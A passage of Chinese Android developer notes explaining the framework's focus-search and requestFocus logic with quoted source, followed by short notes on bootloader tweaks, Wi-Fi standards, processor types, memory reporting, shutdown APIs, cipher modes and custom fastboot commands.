            return findViewInsideOutShouldExist(root, mNextFocusUpId);
        case FOCUS_DOWN:
            if (mNextFocusDownId == View.NO_ID) return null;
            return findViewInsideOutShouldExist(root, mNextFocusDownId);
        case FOCUS_FORWARD:
            if (mNextFocusForwardId == View.NO_ID) return null;
            return findViewInsideOutShouldExist(root, mNextFocusForwardId);
        case FOCUS_BACKWARD: {
            if (mID == View.NO_ID) return null;
            final View rootView = root;
            final View startView = this;
            // Since we have forward links but no backward links, we need to find the view that
            // forward links to this view. We can't just find the view with the specified ID
            // because view IDs need not be unique throughout the tree.
            return root.findViewByPredicateInsideOut(startView,
                t -> findViewInsideOutShouldExist(rootView, t, t.mNextFocusForwardId)
                        == startView);
        }
    }
    return null;
}
如果用户没有指定下一个获取焦点的View, 接下来就会走Android内部的寻焦算法，首先把可以获取焦点的候选View,放置到一个View列表focusables中，而执行这个添加任务是通过这个addFocusables方法，它会同样也是从上到下遍历整个View树。
effectiveRoot.addFocusables(focusables, direction);
所以addFocusables也分View和ViewGroup,先看View的逻辑,如果这个View符合获取焦点的资格，那么将其添加到views中。先看View中的实现:
# View.java
public void addFocusables(ArrayList<View> views, @FocusDirection int direction,
        @FocusableMode int focusableMode) {
    if (views == null) {
        return;
    }
    if (!canTakeFocus()) {
        return;
    }
    if ((focusableMode & FOCUSABLES_TOUCH_MODE) == FOCUSABLES_TOUCH_MODE
            && !isFocusableInTouchMode()) {
        return;
    }
    views.add(this);//符合获取焦点的资格，将自己添加到views中
}
在ViewGroup逻辑稍微复杂一些.
#ViewGroup.java
@Override
public void addFocusables(ArrayList<View> views, int direction, int focusableMode) {
    final int focusableCount = views.size();

    final int descendantFocusability = getDescendantFocusability();
    final boolean blockFocusForTouchscreen = shouldBlockFocusForTouchscreen();
    final boolean focusSelf = (isFocusableInTouchMode() || !blockFocusForTouchscreen);

    if (descendantFocusability == FOCUS_BLOCK_DESCENDANTS) {//当descendantFocusability为FOCUS_BLOCK_DESCENDANTS时，
        //禁止让自己的子View获取焦点
        if (focusSelf) {
            super.addFocusables(views, direction, focusableMode);//验证自己是否可以被添加的views中，如果符合就添加之
        }
        return;
    }

    if (blockFocusForTouchscreen) {
        focusableMode |= FOCUSABLES_TOUCH_MODE;
    }

    if ((descendantFocusability == FOCUS_BEFORE_DESCENDANTS) && focusSelf) {//当descendantFocusability
        //为FOCUS_BEFORE_DESCENDANTS优先子View获取焦点时
        super.addFocusables(views, direction, focusableMode);//验证自己是否可以被添加的views中，如果符合就添加之
    }

    int count = 0;
    final View[]  children = new View[mChildrenCount] ;
    for (int i = 0; i < mChildrenCount; ++i) {
        View child = mChildren[i] ;
        if ((child.mViewFlags & VISIBILITY_MASK) == VISIBLE) {
            children[count++]  = child;
        }
    }
    FocusFinder.sort(children, 0, count, this, isLayoutRtl());
    for (int i = 0; i < count; ++i) {//将自己符合条件的子Vieｗ添加到views中
        children[i] .addFocusables(views, direction, focusableMode);
    }

    // When set to FOCUS_AFTER_DESCENDANTS, we only add ourselves if
    // there aren't any focusable descendants.  this is
    // to avoid the focus search finding layouts when a more precise search
    // among the focusable children would be more interesting.
    if ((descendantFocusability == FOCUS_AFTER_DESCENDANTS) && focusSelf
            && focusableCount == views.size()) {
        super.addFocusables(views, direction, focusableMode);
    }
}
讲到这里出现了ViewGroup获取焦点的3种策略，

FOCUS_BEFORE_DESCENDANTS: 在子View之前优先获取焦点。
FOCUS_AFTER_DESCENDANTS: 当子View都不获取焦点时，才获取焦点
FOCUS_BLOCK_DESCENDANTS: 禁止子View获取焦点

而在ViewGroup中默认的descendantFocusability是FOCUS_BEFORE_DESCENDANTS:
private void initViewGroup() {
  ...
    setDescendantFocusability(FOCUS_BEFORE_DESCENDANTS);
  ...
}
上面就是addFocusables的流程，这个方法很有用，通过复写它，可以简化focusables的大小，从而提高寻焦的效率。Tv开发Leanback框架中GridLayoutManager类的onAddFocusables方法，就是实现的RecyclerView的addFocusables方法。
下一个获取焦点的候选名单已经找好了，但是我们选哪个呢，继续我们寻焦逻辑，findNextFocus还有一个同名重用方法，在这个方法将从这些候选名单中找出那个最优者，当然也有可能找不到。
＃FoucsFinder.java
private View findNextFocus(ViewGroup root, View focused, Rect focusedRect,
        int direction, ArrayList<View> focusables) {
    if (focused != null) {
        if (focusedRect == null) {
            focusedRect = mFocusedRect;
        }
        // fill in interesting rect from focused
        focused.getFocusedRect(focusedRect);//获取focused所在的区域
        root.offsetDescendantRectToMyCoords(focused, focusedRect);//统一坐标
    } else {
        if (focusedRect == null) {
            focusedRect = mFocusedRect;
            // make up a rect at top left or bottom right of root
            switch (direction) {
                case View.FOCUS_RIGHT:
                case View.FOCUS_DOWN:
                    setFocusTopLeft(root, focusedRect);//如果focused为空，那么FOCUS_RIGHT和FOCUS_DOWN对于的
                    //focusedRect就是一个点
                    break;
                case View.FOCUS_FORWARD:
                    if (root.isLayoutRtl()) {
                        setFocusBottomRight(root, focusedRect);
                    } else {
                        setFocusTopLeft(root, focusedRect);
                    }
                    break;

                case View.FOCUS_LEFT:
                case View.FOCUS_UP:
                    setFocusBottomRight(root, focusedRect);//同上
                    break;
                case View.FOCUS_BACKWARD:
                    if (root.isLayoutRtl()) {
                        setFocusTopLeft(root, focusedRect);
                    } else {
                        setFocusBottomRight(root, focusedRect);
                    break;
                }
            }
        }
    }
 //上面的逻辑就是通过focused计算出它所占据的区域
    switch (direction) {
        case View.FOCUS_FORWARD:
        case View.FOCUS_BACKWARD:
            return findNextFocusInRelativeDirection(focusables, root, focused, focusedRect,
                    direction);
        case View.FOCUS_UP:
        case View.FOCUS_DOWN:
        case View.FOCUS_LEFT:
        case View.FOCUS_RIGHT:
            //上下左右方向寻找下个获取焦点view的算法
            return findNextFocusInAbsoluteDirection(focusables, root, focused,
                    focusedRect, direction);
        default:
            throw new IllegalArgumentException("Unknown direction: " + direction);
    }
}
上面的逻辑就是通过focused计算出它所占据的区域，一个Rect,然后通过这个focusedRect去和所有的候选者的Rect去做对比，找出“最亲近”的那个，以FOCUS_UP、FOCUS_DOWN、FOCUS_LEFT、FOCUS_RIGHT为例，它的算法实现在findNextFocusInAbsoluteDirection方法中，离真相越来越近了，是不是很鸡冻!!!
＃FoucsFinder.java
View findNextFocusInAbsoluteDirection(ArrayList<View> focusables, ViewGroup root, View focused,
        Rect focusedRect, int direction) {
    // initialize the best candidate to something impossible
    // (so the first plausible view will become the best choice)
    mBestCandidateRect.set(focusedRect);//mBestCandidateRect为最佳候选View所在的区域，初始化为focusedRect
    switch(direction) {
        case View.FOCUS_LEFT:
            mBestCandidateRect.offset(focusedRect.width() + 1, 0);
            break;
        case View.FOCUS_RIGHT:
            mBestCandidateRect.offset(-(focusedRect.width() + 1), 0);
            break;
        case View.FOCUS_UP:
            mBestCandidateRect.offset(0, focusedRect.height() + 1);
            break;
        case View.FOCUS_DOWN:
            mBestCandidateRect.offset(0, -(focusedRect.height() + 1));
    }

    View closest = null;

    int numFocusables = focusables.size();
    for (int i = 0; i < numFocusables; i++) {//遍历整个focusables，寻找下一个最和是的获取焦点的View
        View focusable = focusables.get(i);

        // only interested in other non-root views
        if (focusable == focused || focusable == root) continue;

        // get focus bounds of other view in same coordinate system
        focusable.getFocusedRect(mOtherRect);//将focusable的位置信息保存在mOtherRect中
        root.offsetDescendantRectToMyCoords(focusable, mOtherRect);//统一坐标

        if (isBetterCandidate(direction, focusedRect, mOtherRect, mBestCandidateRect)) {
            //比较mOtherRect和mBestCandidateRect，如果mOtherRect比mBestCandidateRect更靠近focusedRect则
            //将mOtherRect赋值给mBestCandidateRect
            mBestCandidateRect.set(mOtherRect);
            closest = focusable;
        }
    }
 //当循环完毕，closest就是哪个下一个获取焦点的最佳View
    return closest;
}
说明一下上面的逻辑: 给出一个mBestCandidateRect变量，它里面保存了当前那个“最亲近”的最优解，通过遍历focusables,和mBestCandidateRect做对比，如果有比mBestCandidateRect更优的解，则替换这个mBestCandidateRect，直到遍历完成，最后的这个mBestCandidateRect就是我们找的那个最优解。过程类似选择排序。所以还有最后的一个问题了，就是两个Rect的对比，哪个会胜出？哪个更"亲近"？
比较两个View的区域哪个是最好的候选者
＃FoucsFinder.java
/**
 * Is rect1 a better candidate than rect2 for a focus search in a particular
 * direction from a source rect?  This is the core routine that determines
 * the order of focus searching.
 * @param direction the direction (up, down, left, right)
 * @param source The source we are searching from
 * @param rect1 The candidate rectangle
 * @param rect2 The current best candidate.
 * @return Whether the candidate is the new best.
 */
boolean isBetterCandidate(int direction, Rect source, Rect rect1, Rect rect2) {

    // to be a better candidate, need to at least be a candidate in the first
    // place :)
    if (!isCandidate(source, rect1, direction)) {//判断是否是候选者，候选view需要在指定的方向里
        return false;
    }

    // we know that rect1 is a candidate.. if rect2 is not a candidate,
    // rect1 is better
    if (!isCandidate(source, rect2, direction)) {
        return true;
    }

    // if rect1 is better by beam, it wins
    if (beamBeats(direction, source, rect1, rect2)) {//判断两个候选区域哪个在光束里，哪个获胜，啥叫光束？后面会介绍，图文介绍
        return true;
    }

    // if rect2 is better, then rect1 cant' be :)
    if (beamBeats(direction, source, rect2, rect1)) {
        return false;
    }

    // otherwise, do fudge-tastic comparison of the major and minor axis
    return (getWeightedDistanceFor(//比重权重距离，与direction有关
                    majorAxisDistance(direction, source, rect1),
                    minorAxisDistance(direction, source, rect1))
            < getWeightedDistanceFor(
                    majorAxisDistance(direction, source, rect2),
                    minorAxisDistance(direction, source, rect2)));
}
主要代码都贴了，但是如果你没有很大的耐心的话，弄清楚上面的这几段算法代码还是比较困难的（所以一些分支代码就不贴了），我现在直接给出结论，然后你可以再看代码来验证这些结论，当然我会给出一个demo，方便你来验证这些结论，是不是很贴心。上面的代码总结出来有３条算法规则，一图胜千言，我将用３幅图解释这３条算法规则:

第一条规则: isCandidate
首先是比较传入的两个Rect，哪个在候选区域，那么啥叫候选区域？候选区域要位于焦点方向上，也就是direction所在的方向里。举个例子，假如你的direction是FOCUS_LEFT, 那么候选区域必须在Focused区域的左边,如下图: A就在候选区域，而B不是。

第二条规则:beamBeats
还是以FOCUS_LEFT为例，如下图，A和BEAM（这个BEAM就是那个光束，看图一下就明白了吧）有重合的部分而Ｂ没有，则AB比拼中，A胜出。

第三条规则:getWeightedDistanceFor
如果beamBeats中，A和B都没有和BEAM有重合的区域，或者都有重合的区域，那该怎么办?这就需要第三条规则, 比较AB区域距离Focused的权重距离，这个权重距离怎么算呢？还是以direction为FOCUS_LEFT为例, 为什么要强调这个direction,因为它会影响权重距离的计算，比如FOCUS_LEFT，他会增加dx的权重，比如
A距离的平方: 13 * dx2^2 + dy2^2, B距离的平方: 13 * dx1^2 + dy2^2. 如果是FOCUS_DOWN则会加大dy的权重。

到现在focusSearch的逻辑已经走完了，有两种结果，一种是我们找到了下一个获取焦点的View,另一种是没找到。如果没找到，让View处理Event事件怎么消费，或者不消费。如果找到了呢？回到ViewRootImpl.performFocusNavigation方法，接下来就是使用找到的View去requestFocus. 它的作用是通知自己的七大姑八大姨说我拿到焦点了，也就是整个View树，同时，拿到焦点后更新一下自己的状态，要不用户怎么知道你这个View拿到焦点了呢，对吧。好，上代码，先看View的requestFocus方法，当然ViewGroup也复写了这个方法。
public boolean requestFocus(int direction, Rect previouslyFocusedRect) {
    return requestFocusNoSearch(direction, previouslyFocusedRect);
}

private boolean requestFocusNoSearch(int direction, Rect previouslyFocusedRect) {
    // need to be focusable
    if (!canTakeFocus()) {//判断当前View有没有获取焦点的资格
        return false;
    }

    // need to be focusable in touch mode if in touch mode
    if (isInTouchMode() &&
        (FOCUSABLE_IN_TOUCH_MODE != (mViewFlags & FOCUSABLE_IN_TOUCH_MODE))) {//如果是在touch mode,需要
        //focusableInTouchMode为ｔrue
           return false;
    }

    // need to not have any parents blocking us
    if (hasAncestorThatBlocksDescendantFocus()) {//父布局是不是禁止我们获取焦点
        return false;
    }

    if (!isLayoutValid()) {
        mPrivateFlags |= PFLAG_WANTS_FOCUS;
    } else {
        clearParentsWantFocus();
    }
 //获取焦点
    handleFocusGainInternal(direction, previouslyFocusedRect);
    return true;
}
获取焦点
void handleFocusGainInternal(@FocusRealDirection int direction, Rect previouslyFocusedRect) {
    if (DBG) {
        System.out.println(this + " requestFocus()");
    }

    if ((mPrivateFlags & PFLAG_FOCUSED) == 0) {
        mPrivateFlags |= PFLAG_FOCUSED;

        View oldFocus = (mAttachInfo != null) ? getRootView().findFocus() : null;

        if (mParent != null) {
            //层层上报，告诉父布局获取当前View获取焦点，并且将旧的焦点清除
            //当传入到最上层的ViewRootImpl会触发一次View树重绘
            mParent.requestChildFocus(this, this);
            updateFocusedInCluster(oldFocus, direction);
        }

        if (mAttachInfo != null) {
            mAttachInfo.mTreeObserver.dispatchOnGlobalFocusChange(oldFocus, this);
        }
  //通知监听焦点变化的listener
        onFocusChanged(true, direction, previouslyFocusedRect);
        refreshDrawableState();//更新drawble状态，高亮显示等
    }
}
层层上报，告诉父布局获取当前View获取焦点，并且将旧的焦点清除
＃ViewGroup.java
@Override
public void requestChildFocus(View child, View focused) {
    if (DBG) {
        System.out.println(this + " requestChildFocus()");
    }
    if (getDescendantFocusability() == FOCUS_BLOCK_DESCENDANTS) {
        return;
    }

    // Unfocus us, if necessary
    super.unFocus(focused);

    // We had a previous notion of who had focus. Clear it.
    if (mFocused != child) {//清楚旧的焦点状态
        if (mFocused != null) {
            mFocused.unFocus(focused);
        }

        mFocused = child;
    }
    if (mParent != null) {//继续就上执行当前操作
        mParent.requestChildFocus(this, focused);
    }
}
requestChildFocus方法层层上报，到上传到View树的最上层，也就是ViewRootImpl中，会触发一次View树的重绘。这一点在UI效率优化时，应该会用到。
＃ViewRootImpl.java 
    
@Override
public void requestChildFocus(View child, View focused) {
    if (DEBUG_INPUT_RESIZE) {
        Log.v(mTag, "Request child focus: focus now " + focused);
    }
    checkThread();//检查线程
    scheduleTraversals();//触发View重绘
}
总结一下View的requestFoucs做的工作:

首先判断当前View是否有资格获取焦点
如果符合获取焦点的资格，View添加PFLAG_FOCUSED，并且层层的通知父布局，确保只有一个View获取焦点，当调用到View的最上层ViewRootImpl时会触发整个View树的重绘。
调用onFoucsChange，通知监听者。
更新drawable状态。

上面是View的requestFocus流程，下面看一下ViewGroup的requestFoucs流程，会比View稍微复杂一些。
public boolean requestFocus(int direction, Rect previouslyFocusedRect) {
    if (DBG) {
        System.out.println(this + " ViewGroup.requestFocus direction="
                + direction);
    }
    int descendantFocusability = getDescendantFocusability();

    boolean result;
    switch (descendantFocusability) {
        case FOCUS_BLOCK_DESCENDANTS://禁止子View获取焦点
            result = super.requestFocus(direction, previouslyFocusedRect);
            break;
        case FOCUS_BEFORE_DESCENDANTS: {//优先子View获取焦点
            final boolean took = super.requestFocus(direction, previouslyFocusedRect);
            result = took ? took : onRequestFocusInDescendants(direction,
                    previouslyFocusedRect);
            break;
        }
        case FOCUS_AFTER_DESCENDANTS: {//子View优先获取焦点
            final boolean took = onRequestFocusInDescendants(direction, previouslyFocusedRect);
            result = took ? took : super.requestFocus(direction, previouslyFocusedRect);
            break;
        }
        default:
            throw new IllegalStateException(
                    "descendant focusability must be one of FOCUS_BEFORE_DESCENDANTS,"
                        + " FOCUS_AFTER_DESCENDANTS, FOCUS_BLOCK_DESCENDANTS but is "
                            + descendantFocusability);
    }
    if (result && !isLayoutValid() && ((mPrivateFlags & PFLAG_WANTS_FOCUS) == 0)) {
        mPrivateFlags |= PFLAG_WANTS_FOCUS;
    }
    return result;
}
onRequestFocusInDescendants 负责让子View获取焦点，开发者可以复写该方法，自定义子View获取焦点的策略。
protected boolean onRequestFocusInDescendants(int direction,
        Rect previouslyFocusedRect) {
    int index;
    int increment;
    int end;
    int count = mChildrenCount;
    if ((direction & FOCUS_FORWARD) != 0) {
        index = 0;
        increment = 1;
        end = count;
    } else {
        index = count - 1;
        increment = -1;
        end = -1;
    }
    final View[]  children = mChildren;
    for (int i = index; i != end; i += increment) {
        View child = children[i] ;
        if ((child.mViewFlags & VISIBILITY_MASK) == VISIBLE) {
            if (child.requestFocus(direction, previouslyFocusedRect)) {
                return true;
            }
        }
    }
    return false;
}
总结
好了，总结一下，从用遥控器按下键开始，到设备接收到按键信号，然后通过Android输入系统转化为Event事件，分发给当前的窗口的ViewRootImpl，然后通过View的focusSearch查找的下一个获取焦点的View,再通过requestFocus,让它真生得到焦点。这篇文章主要在讨论焦点，所以涉及到Android的输入系统、WMS系统等都比较简单的略过，但是既然是焦点的一生，所以把其来龙去脉都提及了一下，但是涉及的这些模块又非常的重要且复杂，希望后面会单独出文章介绍。完!
```

## TODO : Android R彩蛋分析?

```text
frameworks/base/core/java/com/android/internal/app/PlatLogoActivity.java

frameworks/base/core/res/AndroidManifest.xml
<activity android:name="com.android.internal.app.PlatLogoActivity"
    android:theme="@style/Theme.DeviceDefault.DayNight"
    android:configChanges="orientation|keyboardHidden"
    android:icon="@drawable/platlogo"
    android:process=":ui">
</activity>

packages/apps/Settings/src/com/android/settings/deviceinfo/firmwareversion/FirmwareVersionDetailPreferenceController.java
@Override
public boolean handlePreferenceTreeClick(Preference preference) {
    ......
        final Intent intent = new Intent(Intent.ACTION_MAIN)
                .setClassName(
                        "android", com.android.internal.app.PlatLogoActivity.class.getName());
        try {
            mContext.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Unable to start activity " + intent.toString());
        }
    ......
    return true;
}
```

## 如何读取framework下的资源?

```text
int resId = getResources().getIdentifier("config_mms_user_agent_profile_url", "string", "android");
String resVal = getResources().getString(resId);
```

## Android 9 禁用按住电源键+音量加键进入工厂测试（recovery模式）功能

```text
在某些特殊设备中可能需要禁掉这种Android系统自带的recovery模式功能

找到bootloader阶段相关源文件
vendor/mediatek/proprietary/bootable/bootloader/lk/platform/mt6771/boot_mode.c

查看boot_mode_select函数，修改factory_forbidden变量的值

int factory_forbidden = 1;
找到lk阶段相关源文件
vendor/mediatek/proprietary/bootable/bootloader/lk/target/tb8788p1_64_bsp/include/target/cust_key.h

找到宏定义MT65XX_RECOVERY_KEY，注释掉该宏定义

#define MT65XX_RECOVERY_KEY (kpd_dts_data.kpd_hw_recovery_key)
```

## [知识点] wifi b/g/n 这三个版本有什么区别，以及wifi AP ???

```text
802.11bgn含义  
802.11是无线网络连接的标准，就是我们通常所说的WIFI。
802.11b是指11M的速率标准;
802.11g是指54M的速率标准;
802.11n是指150M的速率标准。他们向下兼容

双频段工作:
由于众多设备工作在2.4GHz频段，造成干扰，所以现在的设备都设计成双频段，以避开干扰。
支持2.4GHz和5GHz双频段同时工作，2.4GHz频段无线传输速率可到300Mbps，5GHz频段无线传输速率可达450Mbps，两个频段同时工作，无线最高速率可达750Mbps，速度赶超传统百兆有线，轻松支持高清（1080P）电影播放、在线视频、3D 游戏等高网速应用。

11Mbs / 8 = 1.375MBs
54Mbs / 8 = 6.75MBs
150Mbs / 8 = 18.75MBs
```

## [prop] SystemProperty--aid

```text
system/core/include/private/android_filesystem_config.h
```

## [知识点] CPU,GPU,TPU,NPU,FPGA都是什么？

```text
中央处理器（CPU），是电子计算机的主要设备之一，电脑中的核心配件。其功能主要是解释计算机指令以及处理计算机软件中的数据。CPU是计算机中负责读取指令，对指令译码并执行指令的核心部件。中央处理器主要包括两个部分，即控制器、运算器，其中还包括高速及实现它们缓冲处理器之间联系的数据、控制的总线。电子计算机三大核心部件就是CPU、内部存储器、输入/输出设备。中央处理器的功效主要为处理指令、执行操作、控制时间、处理数据。在计算机体系结构中，CPU 是对计算机的所有硬件资源（如存储器、输入输出单元） 进行控制调配、执行通用运算的核心硬件单元。CPU 是计算机的运算和控制核心。计算机系统中所有软件层的操作，最终都将通过指令集映射为CPU的操作。

什么是GPU?
图形处理器（英语：Graphics Processing Unit，缩写：GPU），又称显示核心、视觉处理器、显示芯片，是一种专门在个人电脑、工作站、游戏机和一些移动设备（如平板电脑、智能手机等）上做图像和图形相关运算工作的微处理器。
GPU使显卡减少了对CPU的依赖，并进行部分原本CPU的工作，尤其是在3D图形处理时GPU所采用的核心技术有硬件T&L（几何转换和光照处理）、立方环境材质贴图和顶点混合、纹理压缩和凹凸映射贴图、双重纹理四像素256位渲染引擎等，而硬件T&L技术可以说是GPU的标志。GPU的生产商主要有NVIDIA和ATI。
GPU的构成相对简单，有数量众多的计算单元和超长的流水线，特别适合处理大量的类型统一的数据。但GPU无法单独工作，必须由CPU进行控制调用才能工作。CPU可单独作用，处理复杂的逻辑运算和不同的数据类型，但当需要大量的处理类型统一的数据时，则可调用GPU进行并行计算。

什么是TPU?
TPU（Tensor Processing Unit）即张量处理单元，是一款为机器学习而定制的芯片，经过了专门深度机器学习方面的训练，它有更高效能（每瓦计算能力）。
因为它能加速其第二代人工智能系统TensorFlow的运行，而且效率也大大超过GPU――Google的深层神经网络就是由TensorFlow引擎驱动的。TPU是专为机器学习量身定做的，执行每个操作所需的晶体管数量更少，自然效率更高。
TPU与同期的CPU和GPU相比，可以提供15-30倍的性能提升，以及30-80倍的效率（性能/瓦特）提升。
TPU每瓦能为机器学习提供比所有商用GPU和FPGA更高的量级指令，这基本相当于7年后的科技水平。TPU是为机器学习应用特别开发，以使芯片在计算精度降低的情况下更耐用，这意味每一个操作只需要更少的晶体管，用更多精密且大功率的机器学习模型，并快速应用这些模型，因此用户便能得到更正确的结果。

什么是NPU(Neural Network Processing Unit)?
嵌入式神经网络处理器（NPU）采用“数据驱动并行计算”的架构，特别擅长处理视频、图像类的海量多媒体数据。
NPU处理器专门为物联网人工智能而设计，用于加速神经网络的运算，解决传统芯片在神经网络运算时效率低下的问题。
在GX8010中，CPU和MCU各有一个NPU，MCU中的NPU相对较小，习惯上称为SNPU。
NPU处理器包括了乘加、激活函数、二维数据运算、解压缩等模块。
乘加模块用于计算矩阵乘加、卷积、点乘等功能，NPU内部有64个MAC，SNPU有32个。
激活函数模块采用最高12阶参数拟合的方式实现神经网络中的激活函数，NPU内部有6个MAC，SNPU有3个。
二维数据运算模块用于实现对一个平面的运算，如降采样、平面数据拷贝等，NPU内部有1个MAC，SNPU有1个。
解压缩模块用于对权重数据的解压。为了解决物联网设备中内存带宽小的特点，在NPU编译器中会对神经网络中的权重进行压缩，在几乎不影响精度的情况下，可以实现6-10倍的压缩效果。

FPGA
FPGA（Field－Programmable Gate Array）称为现场可编程门阵列，用户可以根据自身的需求进行重复编程。与 CPU、GPU 相比，具有性能高、功耗低、可硬件编程的特点。
FPGA基本原理是在芯片内集成大量的数字电路基本门电路以及存储器，而用户可以通过烧入FPGA 配置文件来定义这些门电路以及存储器之间的连线。这种烧入不是一次性的，可重复编写定义，重复配置。
FPGA的编程逻辑块（Programable Logic Blocks）中包含很多功能单元，由LUT（Look-up Table）、触发器组成。FPGA是直接通过这些门电路来实现用户的算法，没有通过指令系统的翻译，执行效率更高。

附：
APU -- Accelerated Processing Unit, 加速处理器，AMD公司推出加速图像处理芯片产品。
BPU -- Brain Processing Unit, 地平线公司主导的嵌入式处理器架构。
CPU -- Central Processing Unit 中央处理器， 目前PC core的主流产品。
DPU -- Deep learning Processing Unit, 深度学习处理器，最早由国内深鉴科技提出；另说有Dataflow Processing Unit 数据流处理器， Wave Computing 公司提出的AI架构；Data storage Processing Unit，深圳大普微的智能固态硬盘处理器。
FPU -- Floating Processing Unit 浮点计算单元，通用处理器中的浮点运算模块。
GPU -- Graphics Processing Unit, 图形处理器，采用多线程SIMD架构，为图形处理而生。
HPU -- Holographics Processing Unit 全息图像处理器， 微软出品的全息计算芯片与设备。
IPU -- Intelligence Processing Unit， Deep Mind投资的Graphcore公司出品的AI处理器产品。
MPU/MCU -- Microprocessor/Micro controller Unit， 微处理器/微控制器，一般用于低计算应用的RISC计算机体系架构产品，如ARM-M系列处理器。
NPU -- Neural Network Processing Unit，神经网络处理器，是基于神经网络算法与加速的新型处理器总称，如中科院计算所/寒武纪公司出品的diannao系列。
RPU -- Radio Processing Unit, 无线电处理器， Imagination Technologies 公司推出的集合集Wifi/蓝牙/FM/处理器为单片的处理器。
TPU -- Tensor Processing Unit 张量处理器， Google 公司推出的加速人工智能算法的专用处理器。目前一代TPU面向Inference，二代面向训练。
VPU -- Vector Processing Unit 矢量处理器，Intel收购的Movidius公司推出的图像处理与人工智能的专用芯片的加速计算核心。
WPU -- Wearable Processing Unit， 可穿戴处理器，Ineda Systems公司推出的可穿戴片上系统产品，包含GPU/MIPS CPU等IP。
XPU -- 百度与Xilinx公司在2017年Hotchips大会上发布的FPGA智能云加速，含256核。
ZPU -- Zylin Processing Unit, 由挪威Zylin 公司推出的一款32位开源处理器。
```

## adb shell dumpsys meminfo

```text
RSS (Resident Set Size): 应用程序负责所有共享内存，使用Google Play服务的应用将负责内存共享。
USS (Unique Shared Set): 应用程序不负责任何共享页面。
**PSS (Proportional Set Size)😗*应用将负责与共享共享内存的进程数成比例的页面数统计。

Java：从 Java 或 Kotlin 代码分配的对象的内存。
Native：从 C 或 C++ 代码分配的对象的内存。
即使您的应用中不使用 C++，您也可能会看到此处使用的一些原生内存，因为 Android 框架使用原生内存代表您处理各种任务，如处理图像资源和其他图形时，即使您编写的代码采用 Java 或 Kotlin 语言。
Graphics：图形缓冲区队列向屏幕显示像素（包括 GL 表面、GL 纹理等等）所使用的内存。（注意，这是与 CPU 共享的内存，不是 GPU 专用内存。）
Stack：您的应用中的原生堆栈和 Java 堆栈使用的内存。这通常与您的应用运行多少线程有关。
Code：您的应用用于处理代码和资源（如 dex 字节码、经过优化或编译的 dex 代码、.so 库和字体）的内存。
Others：您的应用使用的系统不确定如何分类的内存。
Allocated：您的应用分配的 Java/Kotlin 对象数。此数字没有计入 C 或 C++ 中分配的对象。
```

## TODO : 如何使用ashmem?

```text
https://blog.csdn.net/yangwen123/article/details/9319773

https://blog.csdn.net/yangwen123/category_1610195.html
```

## Bitmap内存分配

```text
3.0～7.0 Bitmap对象 和 像素数据 统一放到 Java Heap 中(Fresco匿名共享内存上分配)
8.0以上 像素数据放到 Native 内存，Android 8.0 解决图片内存占用过多和图像绘制效率过慢，新增了 硬件位图 Hardware Bitmap（Glide 有支持使用需要注意）。
硬件位图仅在显存 (graphic memory) 里存储像素数据，并对图片仅在屏幕上绘制的场景做了优化。
优化Bitmap的使用、针对性及时分配，及时释放策略
```

## android 实现关机的几种方法

```text
1.通过反射
try {
    //获得ServiceManager类
    Class<?> ServiceManager = Class.forName("android.os.ServiceManager");
    //获得ServiceManager的getService方法
    Method getService = ServiceManager.getMethod("getService", java.lang.String.class);
    //调用getService获取RemoteService
    Object oRemoteService = getService.invoke(null,Context.POWER_SERVICE);
    //获得IPowerManager.Stub类
    Class<?> cStub = Class.forName("android.os.IPowerManager$Stub");
    //获得asInterface方法
    Method asInterface = cStub.getMethod("asInterface", android.os.IBinder.class);
    //调用asInterface方法获取IPowerManager对象
    Object oIPowerManager = asInterface.invoke(null, oRemoteService);
    //获得shutdown()方法
    Method shutdown = oIPowerManager.getClass().getMethod("shutdown",boolean.class,boolean.class);
    //调用shutdown()方法
    shutdown.invoke(oIPowerManager,false,true);
} catch (Exception e) {
    Log.e(TAG, e.toString(), e);
}
相当于调用 IPowerManager.Stub.asInterface(ServiceManager.getService(Context.POWER_SERVICE));

2.通过广播
Intent intent = new Intent();  
intent.setAction(Intent.ACTION_SHUTDOWN);
sendBroadcast(intent);
<uses-permission android:name="android.permission.SHUTDOWN" tools:ignore="ProtectedPermissions" />
```

## [知识点] 加密模式ECB、CBC、CFB、OFB

```text
使用 Android 的 AES/DES/DESede 加密算法时,不要使用默认的加密模式
ECB,应显示指定使用 CBC 或 CFB 加密模式。
说明:
加密模式 ECB、CBC、CFB、OFB 等,其中 ECB 的安全性较弱,会使相同的铭文
在不同的时候产生相同的密文,容易遇到字典攻击,建议使用 CBC 或 CFB 模式。
1) ECB:Electronic codebook,电子密码本模式
2) CBC:Cipher-block chaining,密码分组链接模式
3) CFB:Cipher feedback,密文反馈模式
4) OFB:Output feedback,输出反馈模式
```

## [CMD] 在Fastboot里添加命令

```text
fastboot 是android 默认的一种debug 方法,它的好处是在进入linux kernel 之前即可操作。
默认fastboot 支持的命令:

usage: fastboot [ <option> ]  <command>
commands:
update <filename> reflash device from
update.zip
flashall flash boot
+ recovery + system
flash <partition> [ <filename> ]  write a file to a flash
partition
erase <partition> erase a flash
partition
format <partition> format a flash
partition
getvar <variable> display a
bootloader variable
boot <kernel> [ <ramdisk> ]  download and boot kernel
flash:raw boot <kernel> [ <ramdisk> ]  create bootimage and flash it
devices list all
connected devices
continue continue
with autoboot
reboot reboot
device normally
reboot-bootloader reboot device
into bootloader
help show this
help message
options:
-w erase userdata and cache (and
format if supported by partition type)
-u do not first erase partition
before formatting
-s <specific device> specify device serial number or path to
device port
-l with "devices", lists device
paths
-p <product> specify product name
-c <cmdline> override kernel commandline
-i <vendor id> specify a custom USB vendor id
-b <base_addr> specify a custom kernel base
address
-n <page size> specify the nand page size.
default: 2048
-S <size>[K|M|G]  automatically sparse files
greater than size. 0 to disable

fastboot 提供了扩展的命令符号
fastboot oem command args
下面以fastboot oem hello test 来说明如何扩展

(1).在bootable/bootloader/lk/app/mt_boot/fastboot.c
的fastboot_init 函数中添加一个新的register

//第一个参数是命令的名称
//第二个参数是命令的执行函数
//第三个参数是在security IC 中是否还提供此命令
fastboot_register("oem hello", cmd_oem_hello, FALSE);

(2). 实现cmd_oem_hello 函数
void cmd_oem_hello(const char *arg, void *data, unsigned size) {
    //注意args 是以command 结束开始,即" args"
    if(!strncmp(arg, " OK", strlen(" OK"))){
        fastboot_okey("OK");
    }else{
        fastboot_fail("Not OK");
    }
}

(3). 与PC 端交互
您可以使用下面已经定义好的三个函数与PC 端交互
fastboot_okey(const char* result);
fastboot_fail(const char* reason);
fastboot_info(const char* reason); 

注意这三个打印字符串的长度都不能超过64-1-4 = 59 个字
